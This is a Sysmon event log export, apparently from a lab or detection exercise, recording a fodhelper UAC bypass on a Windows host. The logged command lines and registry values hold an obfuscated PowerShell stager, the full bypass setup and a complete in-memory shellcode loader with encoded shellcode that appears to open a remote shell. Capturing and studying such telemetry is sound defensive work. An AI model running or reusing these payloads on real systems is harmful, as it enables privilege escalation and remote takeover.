"Message","Id","Version","Qualifiers","Level","Task","Opcode","Keywords","RecordId","ProviderName","ProviderId","LogName","ProcessId","ThreadId","MachineName","UserId","TimeCreated","ActivityId","RelatedActivityId","ContainerLog","MatchedQueryIds","Bookmark","LevelDisplayName","OpcodeDisplayName","TaskDisplayName","KeywordsDisplayNames","Properties"
"File created:
RuleName: DLL
UtcTime: 2025-02-08 09:31:36.345
ProcessGuid: {425f3eb2-2477-67a7-6b01-000000001200}
ProcessId: 7952
Image: C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe
TargetFilename: C:\Users\admin\AppData\Local\Temp\apjynfwm\apjynfwm.dll
CreationUtcTime: 2025-02-08 09:31:36.345
User: DESKTOP-F21NMCI\admin","11","2",,"4","11","0","-9223372036854775808","20073","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","3036","4172","DESKTOP-F21NMCI","S-1-5-18","2/8/2025 4:31:36 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","File created (rule: FileCreate)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"File created:
RuleName: -
UtcTime: 2025-02-08 09:31:35.595
ProcessGuid: {425f3eb2-2477-67a7-6b01-000000001200}
ProcessId: 7952
Image: C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe
TargetFilename: C:\Users\admin\AppData\Local\Temp\__PSScriptPolicyTest_1j4a4h25.xxc.ps1
CreationUtcTime: 2025-02-08 09:31:35.595
User: DESKTOP-F21NMCI\admin","11","2",,"4","11","0","-9223372036854775808","20072","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","3036","4172","DESKTOP-F21NMCI","S-1-5-18","2/8/2025 4:31:35 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","File created (rule: FileCreate)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"Process Create:
RuleName: Privilege Elevation Detection
UtcTime: 2025-02-08 09:31:35.461
ProcessGuid: {425f3eb2-2477-67a7-6b01-000000001200}
ProcessId: 7952
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe"" -nop -w hidden -c ""IEX (Get-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name LofgxgDb).LofgxgDb""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-F21NMCI\admin
LogonGuid: {425f3eb2-2334-67a7-9a8d-020000000000}
LogonId: 0x28D9A
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=BCC5A6493E0641AA1E60CBF69469E579,SHA256=7762A4766BC394B4CB2D658144B207183FF23B3139181CD74E615DB63E6E57D6,IMPHASH=C6A0924236A2CDF364F3D2FAD87F702A
ParentProcessGuid: {425f3eb2-2477-67a7-6a01-000000001200}
ParentProcessId: 5832
ParentImage: C:\Windows\System32\fodhelper.exe
ParentCommandLine: ""C:\Windows\System32\fodhelper.exe"" 
ParentUser: DESKTOP-F21NMCI\admin","1","5",,"4","1","0","-9223372036854775808","20071","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","3036","4172","DESKTOP-F21NMCI","S-1-5-18","2/8/2025 4:31:35 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","Process Create (rule: ProcessCreate)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"Process Create:
RuleName: Privilege Elevation Detection
UtcTime: 2025-02-08 09:31:35.387
ProcessGuid: {425f3eb2-2477-67a7-6a01-000000001200}
ProcessId: 5832
Image: C:\Windows\System32\fodhelper.exe
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: Features On Demand Helper
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: FodHelper.EXE
CommandLine: ""C:\Windows\System32\fodhelper.exe"" 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-F21NMCI\admin
LogonGuid: {425f3eb2-2334-67a7-9a8d-020000000000}
LogonId: 0x28D9A
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=7215C73EC1AAE35B9E4B1F22C811F85C,SHA256=7E80DA8D839DCF05E30317256460ED7A4EE25CAB2750D768569AAAB35E1E8C64,IMPHASH=2BD851C90720C3E5FEE7E3FF3ACFA3D5
ParentProcessGuid: {425f3eb2-2477-67a7-6501-000000001200}
ParentProcessId: 3000
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: C:\Windows\Sysnative\cmd.exe /c C:\Windows\System32\fodhelper.exe
ParentUser: DESKTOP-F21NMCI\admin","1","5",,"4","1","0","-9223372036854775808","20070","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","3036","4172","DESKTOP-F21NMCI","S-1-5-18","2/8/2025 4:31:35 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","Process Create (rule: ProcessCreate)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"Process Create:
RuleName: Privilege Elevation Detection
UtcTime: 2025-02-08 09:31:35.346
ProcessGuid: {425f3eb2-2477-67a7-6901-000000001200}
ProcessId: 3396
Image: C:\Windows\System32\consent.exe
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: Consent UI for administrative applications
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: consent.exe
CommandLine: consent.exe 736 324 0000024ADD633FC0
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {425f3eb2-2332-67a7-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 1
IntegrityLevel: System
Hashes: MD5=EE2A1C85C472F89B146CC8EE598CCCBC,SHA256=19FD0010DA92B654D1CA270247061A39EA13C0A58529FD8257A97E2EF7794911,IMPHASH=522D83761201075834F05037F5307949
ParentProcessGuid: {425f3eb2-23d5-67a7-4401-000000001200}
ParentProcessId: 736
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo
ParentUser: NT AUTHORITY\SYSTEM","1","5",,"4","1","0","-9223372036854775808","20069","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","3036","4172","DESKTOP-F21NMCI","S-1-5-18","2/8/2025 4:31:35 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","Process Create (rule: ProcessCreate)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"Process Create:
RuleName: Privilege Elevation Detection
UtcTime: 2025-02-08 09:31:35.343
ProcessGuid: {425f3eb2-2477-67a7-6801-000000001200}
ProcessId: 4032
Image: C:\Windows\System32\fodhelper.exe
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: Features On Demand Helper
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: FodHelper.EXE
CommandLine: ""C:\Windows\System32\fodhelper.exe"" 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-F21NMCI\admin
LogonGuid: {425f3eb2-2334-67a7-e38d-020000000000}
LogonId: 0x28DE3
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=7215C73EC1AAE35B9E4B1F22C811F85C,SHA256=7E80DA8D839DCF05E30317256460ED7A4EE25CAB2750D768569AAAB35E1E8C64,IMPHASH=2BD851C90720C3E5FEE7E3FF3ACFA3D5
ParentProcessGuid: {425f3eb2-2477-67a7-6501-000000001200}
ParentProcessId: 3000
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: C:\Windows\Sysnative\cmd.exe /c C:\Windows\System32\fodhelper.exe
ParentUser: DESKTOP-F21NMCI\admin","1","5",,"4","1","0","-9223372036854775808","20068","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","3036","4172","DESKTOP-F21NMCI","S-1-5-18","2/8/2025 4:31:35 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","Process Create (rule: ProcessCreate)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"Process Create:
RuleName: Privilege Elevation Detection
UtcTime: 2025-02-08 09:31:35.303
ProcessGuid: {425f3eb2-2477-67a7-6701-000000001200}
ProcessId: 6680
Image: C:\Windows\System32\fodhelper.exe
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: Features On Demand Helper
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: FodHelper.EXE
CommandLine: C:\Windows\System32\fodhelper.exe
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-F21NMCI\admin
LogonGuid: {425f3eb2-2334-67a7-e38d-020000000000}
LogonId: 0x28DE3
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=7215C73EC1AAE35B9E4B1F22C811F85C,SHA256=7E80DA8D839DCF05E30317256460ED7A4EE25CAB2750D768569AAAB35E1E8C64,IMPHASH=2BD851C90720C3E5FEE7E3FF3ACFA3D5
ParentProcessGuid: {425f3eb2-2477-67a7-6501-000000001200}
ParentProcessId: 3000
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: C:\Windows\Sysnative\cmd.exe /c C:\Windows\System32\fodhelper.exe
ParentUser: DESKTOP-F21NMCI\admin","1","5",,"4","1","0","-9223372036854775808","20067","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","3036","4172","DESKTOP-F21NMCI","S-1-5-18","2/8/2025 4:31:35 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","Process Create (rule: ProcessCreate)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"Process Create:
RuleName: Privilege Elevation Detection
UtcTime: 2025-02-08 09:31:35.275
ProcessGuid: {425f3eb2-2477-67a7-6501-000000001200}
ProcessId: 3000
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: C:\Windows\Sysnative\cmd.exe /c C:\Windows\System32\fodhelper.exe
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-F21NMCI\admin
LogonGuid: {425f3eb2-2334-67a7-e38d-020000000000}
LogonId: 0x28DE3
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=9D59442313565C2E0860B88BF32B2277,SHA256=D0CEB18272966AB62B8EDFF100E9B4A6A3CB5DC0F2A32B2B18721FEA2D9C09A5,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {425f3eb2-2441-67a7-5901-000000001200}
ParentProcessId: 1476
ParentImage: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4{1}IAD8kp2cCA7VW/2+iShD//ZL7H8jFBEioYDW9t{1}klD7RUWrG2fqt65kJhla0La5dF67t3//ubRag2tZe+l9w'+'mBHZ3Znb2M5+ZYZbGP{1}c0llLW+yH9/PxJykfHY14kKSX2d9jUpNLq6YQQdbddWq+kb5IyMZfLBo08HE/Pz+{1}pYyjm23n5EnEzSVD0'+'QDBKFFX6RxqGiKGjm4dH5HPpp1T6Ub4k9MEjudim7{2}khko7MOBB7Lep7wrNyd0kwV+T{2}32V1clSZli+eUo8kitzdJBxF5YAQWZV+qeLA3maJFNnFPqMJnfHyEMfV43I/TrwZaoO1FXIRD2mQyHCV3WUY4imLxZ2Eka2II{1}Nnh1HfDAKGkkTWpIkwP5lO/1Im+dl3acxxhMpOzBGjyy5iK+yjpNz04oCgOzSbglaXMxzPp6oKYi'+'u6QEopTgnRpP9iRmmjdYHcR5WUfSWQ6nCmahD'+'RN7d0aZAStNWTD7iZcUCF8cIDQO+XAHBW{1}CdID3Bnt1C'+'MSbaDwGGlQxOcqX6TDE1y4XCPU7aBaanHUqROX+CWSj6Kh9pHrVUKVVCcjZaCppMBxcF0Z+BV8EtpKETeJ3IDzXCMGp{2}Yi7BfcFU5FBE0IyjDo1yItcE/Rc43UNBABM09LlAW'+'xHijdhFh/q'+'JrpZgEiJk+RDUBryDg6mtntoFTZCd2UQTgbefA1NIMMgQV0nlWbIrTxRyE5DrxkkSTOimkqK9'+'JXeQRFGiSGSc43zJTTrNPeeeumxKOfS/hhbmp+grM/NA6jRPOUh+CCgD0uk{2}kY48IPDSpiQNkbbp4XhwuH0Sj7hECmQOW'+'VhANWBEodLmgCgM/M1qo5S7iTrQkKAKZrGDYxJtDecjzI+OWN0eBfNDNIg22nBeoF'+'HD{1}OQmh7hLKNWmAGYfikyEM1PpfPrwtO+BMnaE8MEqRW'+'xNrwwX9SwHr1wVDc4AyOBgHKGxGI8tL0EltW2KUL/oN7pgwRk5M3OBqgS{2}OGh4Xnj6uOrT'+'xNbi+emzqrl9POpf2qYnX87V/2jb94CpAZ12Qu8WGczpYN+Ft1ULfMnpm87b{2}8JFjNn{2}YmI9Cnxidi6jVdpJnfd0cCltbG36t1rw3zGq1dlM1FoDeCFfmCzNoR3j93IJ{2}qKU3LctJLMMhF1f1u4fh{1}T0ekqZe{1}8PZkCbdk1FD1/WzwGu4G9O0aFB1N/eVO9pr'+'+pFVi6l+Vq8tzA{2}TrMcXA9ui1yOLmR194M2XdH39uJgfz+umZf{1}YjW/7tnV7a1tm//LxqXGmz/Wz4b0XW{1}PBMR4{2}7+9CmNtwTVc3ak6Anulpa4gHK2HLerL{1}8b1nt{1}YbW9cro+TYW1jUtABYe/xkXoajpd0hoN/rH1NzQNo72dtm49ofV74m7rc{2}EMhJH8e8egwxDESd+/ypFD'+'7gAd6L5ntV3PVYEnoEogwFu{1}g0mzI7r7gd'+'ioWGomR9e4FYjAi0OmiGBUlNQqg{2}Cj7UZmg12wYg+lHfyXw69KVKL4LqrhEUS+fnY/ARSC8YWW6heM5DzXiuGgZUcOPZqGX{1}/{2}jN6nS5UTJjmugBW2wK8yQzDxbxTFKUPw8XtHoOdec9wN7DDk5e'+'QJmAqrVNXoGgRSnZx6+4'+'2I4Ne/gBcBW4/ER0eaAJGDhCT1KJix64'+'31NLj9b9n+VNXo'+'NCeAW/581u7Te7H+KSoeXg{2}Fl/{2}bBXu/8gAkMPc5D{1}Qi0laN{2}bDwGR58pegCE2kAizfIh/3ZuUH7Xh/ykr5{2}8CNHuRf2ULAAA{0}')-f'=','s','v')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
ParentUser: DESKTOP-F21NMCI\admin","1","5",,"4","1","0","-9223372036854775808","20066","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","3036","4172","DESKTOP-F21NMCI","S-1-5-18","2/8/2025 4:31:35 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","Process Create (rule: ProcessCreate)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"Registry value set:
RuleName: T1042
EventType: SetValue
UtcTime: 2025-02-08 09:31:34.970
ProcessGuid: {425f3eb2-2441-67a7-5901-000000001200}
ProcessId: 1476
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-2810783064-3530294918-2968498012-1000_Classes\ms-settings\shell\open\command\LofgxgDb
Details: Set-StrictMode -Version 2
$q_ = @""
	using System;
	using System.Runtime.InteropServices;
	namespace iJ {
		public class func {
			[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
			[Flags] public enum MemoryProtection { ReadWrite = 0x04, Execute= 0x10 }
			[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
			[DllImport(""kernel32.dll"")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
			[DllImport(""kernel32.dll"")] public static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, int flNewProtect,out int lpflOldProtect);
			[DllImport(""kernel32.dll"")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
			[DllImport(""kernel32.dll"")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
		}
	}
""@

$bfd = New-Object Microsoft.CSharp.CSharpCodeProvider
$iZP = New-Object System.CodeDom.Compiler.CompilerParameters
$iZP.ReferencedAssemblies.AddRange(@(""System.dll"", [PsObject].Assembly.Location))
$iZP.GenerateInMemory = $True
$rKqRL = $bfd.CompileAssemblyFromSource($iZP, $q_)

[Byte[]]$a7afc = [System.Convert]::FromBase64String(""/OiPAAAAYInlMdJki1Iwi1IMi1IUMf+LcigPt0omMcCsPGF8Aiwgwc8NAcdJde9SV4tSEItCPAHQi0B4hcB0TAHQi1ggi0gYUAHThcl0PDH/SYs0iwHWMcCswc8NAcc44HX0A334O30kdeBYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS6YD///9daDMyAABod3MyX1RoTHcmB4no/9C4kAEAACnEVFBoKYBrAP/VagpowKjkg2gCABFdieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQM/04Idexo8LWiVv/VagBqBFZXaALZyF//1Ys2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1QHDKcZ17sM="")
[Uint32]$nFUh = 0

$ovTj9 = [iJ.func]::VirtualAlloc(0, $a7afc.Length + 1, [iJ.func+AllocationType]::Reserve -bOr [iJ.func+AllocationType]::Commit, [iJ.func+MemoryProtection]::ReadWrite)
if ([Bool]!$ovTj9) { $global:result = 3; return }
[System.Runtime.InteropServices.Marshal]::Copy($a7afc, 0, $ovTj9, $a7afc.Length)

if ([iJ.func]::VirtualProtect($ovTj9,[Uint32]$a7afc.Length + 1, [iJ.func+MemoryProtection]::Execute, [Ref]$nFUh) -eq $true ) {
	[IntPtr] $aUza0 = [iJ.func]::CreateThread(0,0,$ovTj9,0,0,0)
	if ([Bool]!$aUza0) { $global:result = 7; return }
	$bB = [iJ.func]::WaitForSingleObject($aUza0, [iJ.func+Time]::Infinite)
}

User: DESKTOP-F21NMCI\admin","13","2",,"4","13","0","-9223372036854775808","20065","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","3036","4172","DESKTOP-F21NMCI","S-1-5-18","2/8/2025 4:31:34 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","Registry value set (rule: RegistryEvent)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"Registry value set:
RuleName: T1042
EventType: SetValue
UtcTime: 2025-02-08 09:31:34.861
ProcessGuid: {425f3eb2-2441-67a7-5901-000000001200}
ProcessId: 1476
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-2810783064-3530294918-2968498012-1000_Classes\ms-settings\shell\open\command\(Default)
Details: C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe -nop -w hidden -c ""IEX (Get-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name LofgxgDb).LofgxgDb""
User: DESKTOP-F21NMCI\admin","13","2",,"4","13","0","-9223372036854775808","20064","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","3036","4172","DESKTOP-F21NMCI","S-1-5-18","2/8/2025 4:31:34 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","Registry value set (rule: RegistryEvent)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"Registry value set:
RuleName: T1042
EventType: SetValue
UtcTime: 2025-02-08 09:31:34.767
ProcessGuid: {425f3eb2-2441-67a7-5901-000000001200}
ProcessId: 1476
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-2810783064-3530294918-2968498012-1000_Classes\ms-settings\shell\open\command\DelegateExecute
Details: (Empty)
User: DESKTOP-F21NMCI\admin","13","2",,"4","13","0","-9223372036854775808","20063","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","3036","4172","DESKTOP-F21NMCI","S-1-5-18","2/8/2025 4:31:34 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","Registry value set (rule: RegistryEvent)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"Process Create:
RuleName: Privilege Elevation Detection
UtcTime: 2025-02-08 09:31:34.206
ProcessGuid: {425f3eb2-2476-67a7-6401-000000001200}
ProcessId: 8616
Image: C:\Windows\SysWOW64\whoami.exe
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: whoami  /groups 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-F21NMCI\admin
LogonGuid: {425f3eb2-2334-67a7-e38d-020000000000}
LogonId: 0x28DE3
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=311EFED1B6336ED8DC5471FE58C88CB5,SHA256=AA1583D770C6774F8D8FCEC099CF7BDC05BEB0F08F6DB387F5B37CCA860771D7,IMPHASH=E91037BB26500603D5EE8666BA6C2510
ParentProcessGuid: {425f3eb2-2476-67a7-6201-000000001200}
ParentProcessId: 3704
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd.exe /c whoami /groups 
ParentUser: DESKTOP-F21NMCI\admin","1","5",,"4","1","0","-9223372036854775808","20062","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","3036","4172","DESKTOP-F21NMCI","S-1-5-18","2/8/2025 4:31:34 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","Process Create (rule: ProcessCreate)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
